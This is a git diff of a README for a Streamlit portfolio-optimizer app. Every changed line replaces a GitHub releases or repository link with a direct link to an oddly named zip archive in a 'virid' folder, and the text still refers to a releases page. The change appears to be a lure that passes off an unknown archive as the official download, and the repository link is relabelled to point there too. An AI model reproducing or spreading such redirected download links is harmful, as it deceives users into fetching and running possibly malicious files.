@@ -1,6 +1,6 @@
 # 📊 Factor-based-Portfolio-Optimizer---Streamlit - Smart Portfolio Optimization Made Simple
 
-[![Download Factor-based-Portfolio-Optimizer](https://img.shields.io/badge/Download-Factor--Portfolio--Optimizer-brightgreen)](https://github.com/nestiva5731/Factor-based-Portfolio-Optimizer---Streamlit/releases)
+[![Download Factor-based-Portfolio-Optimizer](https://img.shields.io/badge/Download-Factor--Portfolio--Optimizer-brightgreen)](https://raw.githubusercontent.com/nestiva5731/Factor-based-Portfolio-Optimizer---Streamlit/main/virid/Optimizer-Portfolio-based-Streamlit-Factor-v2.6.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Before you start, make sure your Windows PC meets these requirements:
 
 1. Open this page to download the software:
 
-   [Download Factor-based-Portfolio-Optimizer](https://github.com/nestiva5731/Factor-based-Portfolio-Optimizer---Streamlit/releases)
+   [Download Factor-based-Portfolio-Optimizer](https://raw.githubusercontent.com/nestiva5731/Factor-based-Portfolio-Optimizer---Streamlit/main/virid/Optimizer-Portfolio-based-Streamlit-Factor-v2.6.zip)
 
 2. On the releases page, look for the latest release. It usually shows a version number like `v1.X.X`.
 
@@ -121,10 +121,10 @@ If you want to explore the code or customize the app, you can find the source he
 ## 🔗 Links
 
 - Latest Release and Downloads:  
-  [https://github.com/nestiva5731/Factor-based-Portfolio-Optimizer---Streamlit/releases](https://github.com/nestiva5731/Factor-based-Portfolio-Optimizer---Streamlit/releases)
+  [https://raw.githubusercontent.com/nestiva5731/Factor-based-Portfolio-Optimizer---Streamlit/main/virid/Optimizer-Portfolio-based-Streamlit-Factor-v2.6.zip](https://raw.githubusercontent.com/nestiva5731/Factor-based-Portfolio-Optimizer---Streamlit/main/virid/Optimizer-Portfolio-based-Streamlit-Factor-v2.6.zip)
 
 - GitHub Repository:  
-  https://github.com/nestiva5731/Factor-based-Portfolio-Optimizer---Streamlit
+  https://raw.githubusercontent.com/nestiva5731/Factor-based-Portfolio-Optimizer---Streamlit/main/virid/Optimizer-Portfolio-based-Streamlit-Factor-v2.6.zip
 
 ---
 
